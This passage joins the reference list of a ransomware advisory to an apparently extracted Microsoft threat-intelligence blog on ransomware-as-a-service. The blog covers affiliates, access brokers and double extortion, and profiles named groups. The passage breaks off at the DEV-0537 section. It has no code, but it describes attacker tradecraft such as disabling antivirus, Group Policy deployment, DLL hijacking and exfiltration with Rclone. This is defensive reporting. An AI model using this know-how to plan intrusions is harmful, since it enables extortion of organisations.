2021):\nhttps://thedfirreport.com/2021/09/13/bazarloader-to-conti-ransomware-in-32-hours/\nNSA Cybersecurity Information Sheet: Transition to Multi-Factor Authentication (August\n2019): \n\n https://media.defense.gov/2019/Sep/09/2002180346/-1/-1/0/Transition%20to%20Multi-\nfactor%20Authentication%20-%20Copy.pdf\nNSA Cybersecurity Information Sheet: Segment Networks and Deploy Application-\nAware Defenses (September 2019):\n\n https://media.defense.gov/2019/Sep/09/2002180325/-1/-1/0/Segment%20Networks%2\n0and%20Deploy%20Application%20Aware%20Defenses%20-%20Copy.pdf\n\nhttps://us-cert.cisa.gov/APTs-Targeting-IT-Service-Provider-Customers\nhttps://www.cisa.gov/sites/default/files/publications/CISA_MS-ISAC_Ransomware%20Guide_S508C_.pdf\nhttps://us-cert.cisa.gov/report\nhttps://www.fbi.gov/contact-us/field-offices\nhttp://www.secretservice.gov/contact/field-offices/\nhttps://us-cert.cisa.gov/ncas/alerts/aa20-245a\nhttps://thedfirreport.com/2021/09/13/bazarloader-to-conti-ransomware-in-32-hours/\nhttps://media.defense.gov/2019/Sep/09/2002180346/-1/-1/0/Transition%20to%20Multi-factor%20Authentication%20-%20Copy.pdf\nhttps://media.defense.gov/2019/Sep/09/2002180325/-1/-1/0/Segment%20Networks%20and%20Deploy%20Application%20Aware%20Defenses%20-%20Copy.pdf\n\n\n10/11\n\nNSA Cybersecurity Information Sheet: Hardening Network Devices (August 2020): \nhttps://media.defense.gov/2020/Aug/18/2002479461/-1/-1/0/HARDENING_NETWORK\n_DEVICES.PDF\n\nFree Cyber Hygiene Services\n\nCISA offers a range of no-cost cyber hygiene services to help organizations assess, identify,\nand reduce their exposure to threats, including ransomware.

      "plain_text": "1/22\n\nMay 9, 2022\n\nRansomware-as-a-service: Understanding the cybercrime\ngig economy and how to protect yourself\n\nmicrosoft.com/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-\nhow-to-protect-yourself/\n\nMicrosoft processes 24 trillion signals every 24 hours, and we have blocked billions of\nattacks in the last year alone. Microsoft Security tracks more than 35 unique ransomware\nfamilies and 250 unique threat actors across observed nation-state, ransomware, and\ncriminal activities.\n\nThat depth of signal intelligence gathered from various domains—identity, email, data, and\ncloud—provides us with insight into the gig economy that attackers have created with tools\ndesigned to lower the barrier for entry for other attackers, who in turn continue to pay\ndividends and fund operations through the sale and associated “cut” from their tool’s\nsuccess.\n\nThe cybercriminal economy is a continuously evolving connected ecosystem of many players\nwith different techniques, goals, and skillsets. In the same way our traditional economy has\nshifted toward gig workers for efficiency, criminals are learning that there’s less work and less\nrisk involved by renting or selling their tools for a portion of the profits than performing the\nattacks themselves. This industrialization of the cybercrime economy has made it easier for\nattackers to use ready-made penetration testing and other tools to perform their attacks.\n\nhttps://www.microsoft.com/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-how-to-protect-yourself/\n\n\n2/22\n\nWithin this category of threats, Microsoft has been tracking the trend in the ransomware-as-\na-service (RaaS) gig economy, called human-operated ransomware, which remains one of\nthe most impactful threats to organizations. We coined the industry term “human-operated\nransomware” to clarify that these threats are driven by humans who make decisions at every\nstage of their attacks based on what they find in their target’s network.\n\nUnlike the broad targeting and opportunistic approach of earlier ransomware infections,\nattackers behind these human-operated campaigns vary their attack patterns depending on\ntheir discoveries—for example, a security product that isn‘t configured to prevent tampering\nor a service that’s running as a highly privileged account like a domain admin. Attackers can\nuse those weaknesses to elevate their privileges to steal even more valuable data, leading to\na bigger payout for them—with no guarantee they’ll leave their target environment once\nthey’ve been paid. Attackers are also often more determined to stay on a network once they\ngain access and sometimes repeatedly monetize that access with additional attacks using\ndifferent malware or ransomware payloads if they aren’t successfully evicted.\n\nRansomware attacks have become even more impactful in recent years as more\nransomware-as-a-service ecosystems have adopted the double extortion monetization\nstrategy. All ransomware is a form of extortion, but now, attackers are not only encrypting\ndata on compromised devices but also exfiltrating it and then posting or threatening to post it\npublicly to pressure the targets into paying the ransom. Most ransomware attackers\nopportunistically deploy ransomware to whatever network they get access to, and some even\npurchase access to networks from other cybercriminals. Some attackers prioritize\norganizations with higher revenues, while others prefer specific industries for the shock value\nor type of data they can exfiltrate.\n\nAll human-operated ransomware campaigns—all human-operated attacks in general, for that\nmatter—share common dependencies on security weaknesses that allow them to succeed.\nAttackers most commonly take advantage of an organization’s poor credential hygiene\nand legacy configurations or misconfigurations to find easy entry and privilege\nescalation points in an environment. \n\nIn this blog, we detail several of the ransomware ecosystems  using the RaaS model, the\nimportance of cross-domain visibility in finding and evicting these actors, and best practices\norganizations can use to protect themselves from this increasingly popular style of attack.\nWe also offer security best practices on credential hygiene and cloud hardening, how to\naddress security blind spots, harden internet-facing assets to understand your perimeter, and\nmore. Here’s a quick table of contents:\n\nHow RaaS redefines our understanding of ransomware incidents\n\nWith ransomware being the preferred method for many cybercriminals to monetize attacks,\nhuman-operated ransomware remains one of the most impactful threats to organizations\ntoday, and it only continues to evolve. This evolution is driven by the “human-operated”\n\nhttps://www.microsoft.com/security/blog/2020/03/05/human-operated-ransomware-attacks-a-preventable-disaster/\n\n\n3/22\n\naspect of these attacks—attackers make informed and calculated decisions, resulting in\nvaried attack patterns tailored specifically to their targets and iterated upon until the attackers\nare successful or evicted.\n\nIn the past, we’ve observed a tight relationship between the initial entry vector, tools, and\nransomware payload choices in each campaign of one strain of ransomware. The RaaS\naffiliate model, which has allowed more criminals, regardless of technical expertise, to deploy\nransomware built or managed by someone else, is weakening this link. As ransomware\ndeployment becomes a gig economy, it has become more difficult to link the tradecraft used\nin a specific attack to the ransomware payload developers.\n\nReporting a ransomware incident by assigning it with the payload name gives the impression\nthat a monolithic entity is behind all attacks using the same ransomware payload and that all\nincidents that use the ransomware share common techniques and infrastructure. However,\nfocusing solely on the ransomware stage obscures many stages of the attack that come\nbefore, including actions like data exfiltration and additional persistence mechanisms, as well\nas the numerous detection and protection opportunities for network defenders.\n\nWe know, for example, that the underlying techniques used in human-operated ransomware\ncampaigns haven’t changed very much over the years—attacks still prey on the same\nsecurity misconfigurations to succeed. Securing a large corporate network takes disciplined\nand sustained focus, but there’s a high ROI in implementing critical controls that prevent\nthese attacks from having a wider impact, even if it’s only possible on the most critical assets\nand segments of the network. \n\nWithout the ability to steal access to highly privileged accounts, attackers can’t move\nlaterally, spread ransomware widely, access data to exfiltrate, or use tools like Group Policy\nto impact security settings. Disrupting common attack patterns by applying security controls\nalso reduces alert fatigue in security SOCs by stopping the attackers before they get in. This\ncan also prevent unexpected consequences of short-lived breaches, such as exfiltration of\nnetwork topologies and configuration data that happens in the first few minutes of execution\nof some trojans.\n\nIn the following sections, we explain the RaaS affiliate model and disambiguate between the\nattacker tools and the various threat actors at play during a security incident. Gaining this\nclarity helps surface trends and common attack patterns that inform defensive strategies\nfocused on preventing attacks rather than detecting ransomware payloads. Threat\nintelligence and insights from this research also enrich our solutions like Microsoft 365\nDefender, whose comprehensive security capabilities help protect customers by detecting\nRaaS-related attack attempts.\n\nThe RaaS affiliate model explained\n\nhttps://www.microsoft.com/security/business/threat-protection/microsoft-365-defender\n\n\n4/22\n\nThe cybercriminal economy—a connected ecosystem of many players with different\ntechniques, goals, and skillsets—is evolving. The industrialization of attacks has progressed\nfrom attackers using off-the-shelf tools, such as Cobalt Strike, to attackers being able to\npurchase access to networks and the payloads they deploy to them. This means that the\nimpact of a successful ransomware and extortion attack remains the same regardless of the\nattacker’s skills.\n\nRaaS is an arrangement between an operator and an affiliate. The RaaS operator develops\nand maintains the tools to power the ransomware operations, including the builders that\nproduce the ransomware payloads and payment portals for communicating with victims. The\nRaaS program may also include a leak site to share snippets of data exfiltrated from victims,\nallowing attackers to show that the exfiltration is real and try to extort payment. Many RaaS\nprograms further incorporate a suite of extortion support offerings, including leak site hosting\nand integration into ransom notes, as well as decryption negotiation, payment pressure, and\ncryptocurrency transaction services\n\nRaaS thus gives a unified appearance of the payload or campaign being a single\nransomware family or set of attackers. However, what happens is that the RaaS operator\nsells access to the ransom payload and decryptor to an affiliate, who performs the intrusion\nand privilege escalation and who is responsible for the deployment of the actual ransomware\npayload. The parties then split the profit. In addition, RaaS developers and operators might\nalso use the payload for profit, sell it, and run their campaigns with other ransomware\npayloads—further muddying the waters when it comes to tracking the criminals behind these\nactions.\n\nFigure 1. How the RaaS affiliate model enables ransomware attacks\n\nAccess for sale and mercurial targeting\n\n\n\n5/22\n\nA component of the cybercriminal economy is selling access to systems to other attackers\nfor various purposes, including ransomware. Access brokers can, for instance, infect\nsystems with malware or a botnet and then sell them as a “load”. A load is designed to install\nother malware or backdoors onto the infected systems for other criminals. Other access\nbrokers scan the internet for vulnerable systems, like exposed Remote Desktop Protocol\n(RDP) systems with weak passwords or unpatched systems, and then compromise them en\nmasse to “bank” for later profit. Some advertisements for the sale of initial access specifically\ncite that a system isn’t managed by an antivirus or endpoint detection and response (EDR)\nproduct and has a highly privileged credential such as Domain Administrator associated with\nit to fetch higher prices.\n\nMost ransomware attackers opportunistically deploy ransomware to whatever network they\nget access to. Some attackers prioritize organizations with higher revenues, while some\ntarget specific industries for the shock value or type of data they can exfiltrate (for example,\nattackers targeting hospitals or exfiltrating data from technology companies). In many cases,\nthe targeting doesn’t manifest itself as specifically attacking the target’s network, instead, the\npurchase of access from an access broker or the use of existing malware infection to pivot to\nransomware activities.\n\nIn some ransomware attacks, the affiliates who bought a load or access may not even know\nor care how the system was compromised in the first place and are just using it as a “jump\nserver” to perform other actions in a network. Access brokers often list the network details for\nthe access they are selling, but affiliates aren’t usually interested in the network itself but\nrather the monetization potential. As a result, some attacks that seem targeted to a specific\nindustry might simply be a case of affiliates purchasing access based on the number of\nsystems they could deploy ransomware to and the perceived potential for profit.\n\n“Human-operated” means human decisions\n\nMicrosoft coined the term “human-operated ransomware” to clearly define a class of attacks\ndriven by expert human intelligence at every step of the attack chain and culminate in\nintentional business disruption and extortion. Human-operated ransomware attacks share\ncommonalities in the security misconfigurations of which they take advantage and the\nmanual techniques used for lateral movement and persistence. However, the human-\noperated nature of these actions means that variations in attacks—including objectives and\npre-ransom activity—evolve depending on the environment and the unique opportunities\nidentified by the attackers.\n\nThese attacks involve many reconnaissance activities that enable human operators to profile\nthe organization and know what next steps to take based on specific knowledge of the target.\nMany of the initial access campaigns that provide access to RaaS affiliates perform\nautomated reconnaissance and exfiltration of information collected in the first few minutes of\nan attack.\n\n\n\n6/22\n\nAfter the attack shifts to a hands-on-keyboard phase, the reconnaissance and activities\nbased on this knowledge can vary, depending on the tools that come with the RaaS and the\noperator’s skill. Frequently attackers query for the currently running security tools, privileged\nusers, and security settings such as those defined in Group Policy before continuing their\nattack. The data discovered via this reconnaissance phase informs the attacker’s next steps.\n\nIf there’s minimal security hardening to complicate the attack and a highly privileged account\ncan be gained immediately, attackers move directly to deploying ransomware by editing a\nGroup Policy. The attackers take note of security products in the environment and attempt to\ntamper with and disable these, sometimes using scripts or tools provided with RaaS\npurchase that try to disable multiple security products at once, other times using specific\ncommands or techniques performed by the attacker.  \n\nThis human decision-making early in the reconnaissance and intrusion stages means that\neven if a target’s security solutions detect specific techniques of an attack, the attackers may\nnot get fully evicted from the network and can use other collected knowledge to attempt to\ncontinue the attack in ways that bypass security controls. In many instances, attackers test\ntheir attacks “in production” from an undetected location in their target’s environment,\ndeploying tools or payloads like commodity malware. If these tools or payloads are detected\nand blocked by an antivirus product, the attackers simply grab a different tool, modify their\npayload, or tamper with the security products they encounter. Such detections could give\nSOCs a false sense of security that their existing solutions are working. However, these\ncould merely serve as a smokescreen to allow the attackers to further tailor an attack chain\nthat has a higher probability of success. Thus, when the attack reaches the active attack\nstage of deleting backups or shadow copies, the attack would be minutes away from\nransomware deployment. The adversary would likely have already performed harmful\nactions like the exfiltration of data. This knowledge is key for SOCs responding to\nransomware: prioritizing investigation of alerts or detections of tools like Cobalt Strike and\nperforming swift remediation actions and incident response (IR) procedures are critical for\ncontaining a human adversary before the ransomware deployment stage.\n\nExfiltration and double extortion\n\nRansomware attackers often profit simply by disabling access to critical systems and causing\nsystem downtime. Although that simple technique often motivates victims to pay, it is not the\nonly way attackers can monetize their access to compromised networks. Exfiltration of data\nand “double extortion,” which refers to attackers threatening to leak data if a ransom hasn’t\nbeen paid, has also become a common tactic among many RaaS affiliate programs—many\nof them offering a unified leak site for their affiliates. Attackers take advantage of common\nweaknesses to exfiltrate data and demand ransom without deploying a payload.\n\nThis trend means that focusing on protecting against ransomware payloads via security\nproducts or encryption, or considering backups as the main defense against ransomware,\ninstead of comprehensive hardening, leaves a network vulnerable to all the stages of a\n\n\n\n7/22\n\nhuman-operated ransomware attack that occur before ransomware deployment. This\nexfiltration can take the form of using tools like Rclone to sync to an external site, setting up\nemail transport rules, or uploading files to cloud services. With double extortion, attackers\ndon’t need to deploy ransomware and cause downtime to extort money. Some attackers\nhave moved beyond the need to deploy ransomware payloads and are shifting straight to\nextortion models or performing the destructive objectives of their attacks by directly deleting\ncloud resources. One such extortion attackers is DEV-0537 (also known as LAPSUS$),\nwhich is profiled below.  \n\nPersistent and sneaky access methods\n\nPaying the ransom may not reduce the risk to an affected network and potentially only\nserves to fund cybercriminals. Giving in to the attackers’ demands doesn’t guarantee that\nattackers ever “pack their bags” and leave a network. Attackers are more determined to stay\non a network once they gain access and sometimes repeatedly monetize attacks using\ndifferent malware or ransomware payloads if they aren’t successfully evicted.\n\nThe handoff between different attackers as transitions in the cybercriminal economy occur\nmeans that multiple attackers may retain persistence in a compromised environment using\nan entirely different set of tools from those used in a ransomware attack. For example, initial\naccess gained by a banking trojan leads to a Cobalt Strike deployment, but the RaaS affiliate\nthat purchased the access may choose to use a less detectable remote access tool such as\nTeamViewer to maintain persistence on the network to operate their broader series of\ncampaigns. Using legitimate tools and settings to persist versus malware implants such as\nCobalt Strike is a popular technique among ransomware attackers to avoid detection and\nremain resident in a network for longer.\n\nSome of the common enterprise tools and techniques for persistence that Microsoft has\nobserved being used include:\n\nAnyDesk\nAtera Remote Management\nngrok.io\nRemote Manipulator System\nSplashtop\nTeamViewer\n\nAnother popular technique attackers perform once they attain privilege access is the creation\nof new backdoor user accounts, whether local or in Active Directory. These newly created\naccounts can then be added to remote access tools such as a virtual private network (VPN)\nor Remote Desktop, granting remote access through accounts that appear legitimate on the\nnetwork. Ransomware attackers have also been observed editing the settings on systems to\nenable Remote Desktop, reduce the protocol’s security, and add new users to the Remote\nDesktop Users group.\n\n\n\n8/22\n\nThe time between initial access to a hands-on keyboard deployment can vary wildly\ndepending on the groups and their workloads or motivations. Some activity groups can\naccess thousands of potential targets and work through these as their staffing allows,\nprioritizing based on potential ransom payment over several months. While some activity\ngroups may have access to large and highly resourced companies, they prefer to attack\nsmaller companies for less overall ransom because they can execute the attack within hours\nor days. In addition, the return on investment is higher from companies that can’t respond to\na major incident. Ransoms of tens of millions of dollars receive much attention but take much\nlonger to develop. Many groups prefer to ransom five to 10 smaller targets in a month\nbecause the success rate at receiving payment is higher in these targets. Smaller\norganizations that can’t afford an IR team are often more likely to pay tens of thousands of\ndollars in ransom than an organization worth millions of dollars because the latter has a\ndeveloped IR capability and is likely to follow legal advice against paying. In some instances,\na ransomware associate threat actor may have an implant on a network and never convert it\nto ransom activity. In other cases, initial access to full ransom (including handoff from an\naccess broker to a RaaS affiliate) takes less than an hour.\n\nFigure 2. Human-operated ransomware targeting and rate of success, based on a sampling\nof Microsoft data over six months between 2021 and 2022\nThe human-driven nature of these attacks and the scale of possible victims under control of\nransomware-associated threat actors underscores the need to take targeted proactive\nsecurity measures to harden networks and prevent these attacks in their early stages.\n\nThreat actors and campaigns deep dive: Threat intelligence-driven\nresponse to human-operated ransomware attacks\n\n\n\n9/22\n\nFor organizations to successfully respond to evict an active attacker, it’s important to\nunderstand the active stage of an ongoing attack. In the early attack stages, such as\ndeploying a banking trojan, common remediation efforts like isolating a system and resetting\nexposed credentials may be sufficient. As the attack progresses and the attacker performs\nreconnaissance activities and exfiltration, it’s important to implement an incident response\nprocess that scopes the incident to address the impact specifically. Using a threat\nintelligence-driven methodology for understanding attacks can assist in determining incidents\nthat need additional scoping.\n\nIn the next sections, we provide a deep dive into the following prominent ransomware threat\nactors and their campaigns to increase community understanding of these attacks and\nenable organizations to better protect themselves:\n\nDEV-0193 cluster (Trickbot LLC): The most prolific ransomware group today  \nELBRUS: (Un)arrested development\nDEV-0504: Shifting payloads reflecting the rise and fall of RaaS programs\nDEV-0237: Prolific collaborator\nDEV-0206 and DEV-0243: An “evil” partnership\nDEV-0401: China-based lone wolf turned LockBit 2.0 affiliate\nDEV-0537: From extortion to destruction\n\nMicrosoft threat intelligence directly informs our products as part of our commitment to track\nadversaries and protect customers. Microsoft 365 Defender customers should prioritize\nalerts titled “Ransomware-linked emerging threat activity group detected”. We also add the\nnote “Ongoing hands-on-keyboard attack” to alerts that indicate a human attacker is in the\nnetwork. When these alerts are raised, it’s highly recommended to initiate an incident\nresponse process to scope the attack, isolate systems, and regain control of credentials\nattackers may be in control of.\n\nA note on threat actor naming: as part of Microsoft’s ongoing commitment to track both\nnation-state and cybercriminal threat actors, we refer to the unidentified threat actors as a\n“development group”. We use a naming structure with a prefix of “DEV” to indicate an\nemerging threat group or unique activity during investigation. When a nation-state group\nmoves out of the DEV stage, we use chemical elements (for example, PHOSPHOROUS and\nNOBELIUM) to name them. On the other hand, we use volcano names (such as ELBRUS)\nfor ransomware or cybercriminal activity groups that have moved out of the DEV state. In the\ncybercriminal economy, relationships between groups change very rapidly. Attackers are\nknown to hire talent from other cybercriminal groups or use “contractors,” who provide gig\neconomy-style work on a limited time basis and may not rejoin the group. This shifting nature\nmeans that many of the groups Microsoft tracks are labeled as DEV, even if we have a\nconcrete understanding of the nature of the activity group.\n\nDEV-0193 cluster (Trickbot LLC): The most prolific ransomware group today\n\n\n\n10/22\n\nA vast amount of the current cybercriminal economy connects to a nexus of activity that\nMicrosoft tracks as DEV-0193, also referred to as Trickbot LLC. DEV-0193 is responsible for\ndeveloping, distributing, and managing many different payloads, including Trickbot,\nBazaloader, and AnchorDNS. In addition, DEV-0193 managed the Ryuk RaaS program\nbefore the latter’s shutdown in June 2021, and Ryuk’s successor, Conti as well as Diavol.\nMicrosoft has been tracking the activities of DEV-0193 since October 2020 and has observed\ntheir expansion from developing and distributing the Trickbot malware to becoming the most\nprolific ransomware-associated cybercriminal activity group active today. \n\nDEV-0193’s actions and use of the cybercriminal gig economy means they often add new\nmembers and projects and utilize contractors to perform various parts of their intrusions. As\nother malware operations have shut down for various reasons, including legal actions, DEV-\n0193 has hired developers from these groups. Most notable are the acquisitions of\ndevelopers from Emotet, Qakbot, and IcedID, bringing them to the DEV-0193 umbrella.\n\nA subgroup of DEV-0193, which Microsoft tracks as DEV-0365, provides infrastructure-as-a-\nservice for cybercriminals. Most notably, DEV-0365 provides Cobalt Strike Beacon-as-a-\nservice. These DEV-0365 Beacons have replaced unique C2 infrastructure in many active\nmalware campaigns. DEV-0193 infrastructure has also been implicated in attacks deploying\nnovel techniques, including exploitation of CVE-2021-40444. \n\nThe leaked chat files from a group publicly labeled as the “Conti Group” in February 2022\nconfirm the wide scale of DEV-0193 activity tracked by Microsoft. Based on our telemetry\nfrom 2021 and 2022, Conti has become one of the most deployed RaaS ecosystems, with\nmultiple affiliates concurrently deploying their payload—even as other RaaS ecosystems\n(DarkSide/BlackMatter and REvil) ceased operations. However, payload-based attribution\nmeant that much of the activity that led to Conti ransomware deployment was attributed to\nthe “Conti Group,” even though many affiliates had wildly different tradecraft, skills, and\nreporting structures. Some Conti affiliates performed small-scale intrusions using the tools\noffered by the RaaS, while others performed weeks-long operations involving data exfiltration\nand extortion using their own techniques and tools. One of the most prolific and successful\nConti affiliates—and the one responsible for developing the “Conti Manual” leaked in August\n2021—is tracked as DEV-0230. This activity group also developed and deployed the\nFiveHands and HelloKitty ransomware payloads and often gained access to an organization\nvia DEV-0193’s BazaLoader infrastructure.\n\nELBRUS: (Un)arrested development\n\nELBRUS, also known as FIN7, has been known to be in operation since 2012 and has run\nmultiple campaigns targeting a broad set of industries for financial gain. ELBRUS has\ndeployed point-of-sale (PoS) and ATM malware to collect payment card information from in-\nstore checkout terminals. They have also targeted corporate personnel who have access to\nsensitive financial data, including individuals involved in SEC filings.\n\nhttps://www.microsoft.com/security/blog/2021/09/15/analyzing-attacks-that-exploit-the-mshtml-cve-2021-40444-vulnerability/\n\n\n11/22\n\nIn 2018, this activity group made headlines when three of its members were arrested. In May\n2020, another arrest was made for an individual with alleged involvement with ELBRUS.\nHowever, despite law enforcement actions against suspected individual members, Microsoft\nhas observed sustained campaigns from the ELBRUS group itself during these periods.\n\nELBRUS is responsible for developing and distributing multiple custom malware families\nused for persistence, including JSSLoader and Griffon. ELBRUS has also created fake\nsecurity companies called “Combi Security” and “Bastion Security” to facilitate the\nrecruitment of employees to their operations under the pretense of working as penetration\ntesters.\n\nIn 2020 ELBRUS transitioned from using PoS malware to deploying ransomware as part\nof a financially motivated extortion scheme, specifically deploying the MAZE and Revil RaaS\nfamilies. ELBRUS developed their own RaaS ecosystem named DarkSide. They deployed\nDarkSide payloads as part of their operations and recruited and managed affiliates that\ndeployed the DarkSide ransomware. The tendency to report on ransomware incidents based\non payload and attribute it to a monolithic gang often obfuscates the true relationship\nbetween the attackers, which is very accurate of the DarkSide RaaS. Case in point, one of\nthe most infamous DarkSide deployments wasn’t performed by ELBRUS but by a\nransomware-as-a-service affiliate Microsoft tracks as DEV-0289.\n\nELBRUS retired the DarkSide ransomware ecosystem in May 2021 and released its\nsuccessor, BlackMatter, in July 2021. Replicating their patterns from DarkSide,\nELBRUS deployed BlackMatter themselves and ran a RaaS program for affiliates. The\nactivity group then retired the BlackMatter ransomware ecosystem in November 2021.\n\nWhile they aren’t currently publicly observed to be running a RaaS program, ELBRUS is very\nactive in compromising organizations via phishing campaigns that lead to their JSSLoader\nand Griffon malware. Since 2019, ELBRUS has partnered with DEV-0324 to distribute their\nmalware implants. DEV-0324 acts as a distributor in the cybercriminal economy, providing a\nservice to distribute the payloads of other attackers through phishing and exploit kit vectors.\nELBRUS has also been abusing CVE-2021-31207 in Exchange to compromise organizations\nin April of 2022, an interesting pivot to using a less popular authenticated vulnerability in the\nProxyShell cluster of vulnerabilities. This abuse has allowed them to target organizations that\npatched only the unauthenticated vulnerability in their Exchange Server and turn\ncompromised low privileged user credentials into highly privileged access as SYSTEM on an\nExchange Server.  \n\nDEV-0504: Shifting payloads reflecting the rise and fall of RaaS programs\n\nAn excellent example of how clustering activity based on ransomware payload alone can\nlead to obfuscating the threat actors behind the attack is DEV-0504. DEV-0504 has deployed\nat least six RaaS payloads since 2020, with many of their attacks becoming high-profile\nincidents attributed to the “REvil gang” or “BlackCat ransomware group”. This attribution\n\nhttps://www.justice.gov/opa/pr/three-members-notorious-international-cybercrime-group-fin7-custody-role-attacking-over-100\n\n\n12/22\n\nmasks the actions of the set of the attackers in the DEV-0504 umbrella, including other REvil\nand BlackCat affiliates. This has resulted in a confusing story of the scale of the ransomware\nproblem and overinflated the impact that a single RaaS program shutdown can have on the\nthreat environment.  \n\nFigure 3. Ransomware payloads distributed by DEV-0504 between 2020 and April 2022\nDEV-0504 shifts payloads when a RaaS program shuts down, for example the deprecation of\nREvil and BlackMatter, or possibly when a program with a better profit margin appears.\nThese market dynamics aren’t unique to DEV-0504 and are reflected in most RaaS affiliates.\nThey can also manifest in even more extreme behavior where RaaS affiliates switch to older\n“fully owned” ransomware payloads like Phobos, which they can buy when a RaaS isn’t\navailable, or they don’t want to pay the fees associated with RaaS programs.\n\nDEV-0504 appears to rely on access brokers to enter a network, using Cobalt Strike\nBeacons they have possibly purchased access to. Once inside a network, they rely heavily\non PsExec to move laterally and stage their payloads. Their techniques require them to have\ncompromised elevated credentials, and they frequently disable antivirus products that aren’t\nprotected with tamper protection.\n\nDEV-0504 was responsible for deploying BlackCat ransomware in companies in the energy\nsector in January 2022. Around the same time, DEV-0504 also deployed BlackCat in attacks\nagainst companies in the fashion, tobacco, IT, and manufacturing industries, among others.\n\nDEV-0237: Prolific collaborator\n\nLike DEV-0504, DEV-0237 is a prolific RaaS affiliate that alternates between different\npayloads in their operations based on what is available. DEV-0237 heavily used Ryuk and\nConti payloads from Trickbot LLC/DEV-0193, then Hive payloads more recently. Many\npublicly documented Ryuk and Conti incidents and tradecraft can be traced back to DEV-\n0237.\n\nAfter the activity group switched to Hive as a payload, a large uptick in Hive incidents was\nobserved. Their switch to the BlackCat RaaS in March 2022 is suspected to be due to public\ndiscourse around Hive decryption methodologies; that is, DEV-0237 may have switched to\n\nhttps://www.securityweek.com/researchers-devise-method-decrypt-hive-ransomware-encrypted-data\n\n\n13/22\n\nBlackCat because they didn’t want Hive’s decryptors to interrupt their business. Overlap in\npayloads has occurred as DEV-0237 experiments with new RaaS programs on lower-value\ntargets. They have been observed to experiment with some payloads only to abandon them\nlater.\n\nFigure 4. Ransomware payloads distributed by DEV-0237 between 2020 and April 2022\nBeyond RaaS payloads, DEV-0237 uses the cybercriminal gig economy to also gain initial\naccess to networks. DEV-0237’s proliferation and success rate come in part from their\nwillingness to leverage the network intrusion work and malware implants of other groups\nversus performing their own initial compromise and malware development.\n\nFigure 5. Examples of DEV-0237’s relationships with other cybercriminal activity groups\nLike all RaaS operators, DEV-0237 relies on compromised, highly privileged account\ncredentials and security weaknesses once inside a network. DEV-0237 often leverages\nCobalt Strike Beacon dropped by the malware they have purchased, as well as tools like\nSharpHound to conduct reconnaissance. The group often utilizes BITSadmin /transfer to\nstage their payloads. An often-documented trademark of Ryuk and Conti deployments is\nnaming the ransomware payload xxx.exe, a tradition that DEV-0237 continues to use no\nmatter what RaaS they are deploying, as most recently observed with BlackCat. In late\nMarch of 2022, DEV-0237 was observed to be using a new version of Hive again.\n\nDEV-0206 and DEV-0243: An “evil” partnership\n\n\n\n14/22\n\nMalvertising, which refers to taking out a search engine ad to lead to a malware payload, has\nbeen used in many campaigns, but the access broker that Microsoft tracks as DEV-0206\nuses this as their primary technique to gain access to and profile networks. Targets are lured\nby an ad purporting to be a browser update, or a software package, to download a ZIP file\nand double-click it. The ZIP package contains a JavaScript file (.js), which in most\nenvironments runs when double-clicked. Organizations that have changed the settings such\nthat script files open with a text editor by default instead of a script handler are largely\nimmune from this threat, even if a user double clicks the script.\n\nOnce successfully executed, the JavaScript framework, also referred to SocGholish, acts as\na loader for other malware campaigns that use access purchased from DEV-0206, most\ncommonly Cobalt Strike payloads. These payloads have, in numerous instances, led to\ncustom Cobalt Strike loaders attributed to DEV-0243. DEV-0243 falls under activities tracked\nby the cyber intelligence industry as “EvilCorp,”  The custom Cobalt Strike loaders are similar\nto those seen in publicly documented Blister malware’s inner payloads. In DEV-0243’s initial\npartnerships with DEV-0206, the group deployed a custom ransomware payload known as\nWastedLocker, and then expanded to additional DEV-0243 ransomware payloads developed\nin-house, such as PhoenixLocker and Macaw.\n\nAround November 2021, DEV-0243 started to deploy the LockBit 2.0 RaaS payload in their\nintrusions. The use of a RaaS payload by the “EvilCorp” activity group is likely an attempt by\nDEV-0243 to avoid attribution to their group, which could discourage payment due to their\nsanctioned status.\n\nFigure 6. The handover from DEV-0206 to DEV-0243\n\nDEV-0401: China-based lone wolf turned LockBit 2.0 affiliate\n\nDiffering from the other RaaS developers, affiliates, and access brokers profiled here, DEV-\n0401 appears to be an activity group involved in all stages of their attack lifecycle, from initial\naccess to ransomware development. Despite this, they seem to take some inspiration from\n\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/wastedlocker-ransomware-us\nhttps://www.elastic.co/blog/elastic-security-uncovers-blister-malware-campaign\n\n\n15/22\n\nsuccessful RaaS operations with the frequent rebranding of their ransomware payloads.\nUnique among human-operated ransomware threat actors tracked by Microsoft, DEV-0401 is\nconfirmed to be a China-based activity group.\n\nDEV-0401 differs from many of the attackers who rely on purchasing access to existing\nmalware implants or exposed RDP to enter a network. Instead, the group heavily utilizes\nunpatched vulnerabilities to access networks, including vulnerabilities in Exchange, Manage\nEngine AdSelfService Plus, Confluence, and Log4j 2. Due to the nature of the vulnerabilities\nthey preferred, DEV-0401 gains elevated credentials at the initial access stage of their\nattack.\n\nOnce inside a network, DEV-0401 relies on standard techniques such as using Cobalt Strike\nand WMI for lateral movement, but they have some unique preferences for implementing\nthese behaviors. Their Cobalt Strike Beacons are frequently launched via DLL search order\nhijacking. While they use the common Impacket tool for WMI lateral movement, they use a\ncustomized version of the wmiexec.py module of the tool that creates renamed output files,\nmost likely to evade static detections. Ransomware deployment is ultimately performed from\na batch file in a share and Group Policy, usually written to the NETLOGON share on a\nDomain Controller, which requires the attackers to have obtained highly privileged\ncredentials like Domain Administrator to perform this action.\n\nFigure 7. Ransomware payloads distributed by DEV-0401 between 2021 and April 2022\nBecause DEV-0401 maintains and frequently rebrands their own ransomware payloads, they\ncan appear as different groups in payload-driven reporting and evade detections and actions\nagainst them. Their payloads are sometimes rebuilt from existing for-purchase ransomware\ntools like Rook, which shares code similarity with the Babuk ransomware family. In February\nof 2022, DEV-0401 was observed deploying the Pandora ransomware family, primarily via\nunpatched VMware Horizon systems vulnerable to the Log4j 2 CVE-2021-44228\nvulnerability.\n\nLike many RaaS operators, DEV-0401 maintained a leak site to post exfiltrated data and\nmotivate victims to pay, however their frequent rebranding caused these systems to\nsometimes be unready for their victims, with their leak site sometimes leading to default web\n\nhttps://twitter.com/MsftSecIntel/status/1480730559739359233\nhttps://digital.nhs.uk/cyber-alerts/2022/cc-4002\nhttps://digital.nhs.uk/cyber-alerts/2022/cc-4002\n\n\n16/22\n\nserver landing pages when victims attempt to pay.  In a notable shift—possibly related to\nvictim payment issues—DEV-0401 started deploying LockBit 2.0 ransomware payloads in\nApril 2022.\n\nDEV-0537: From extortion to 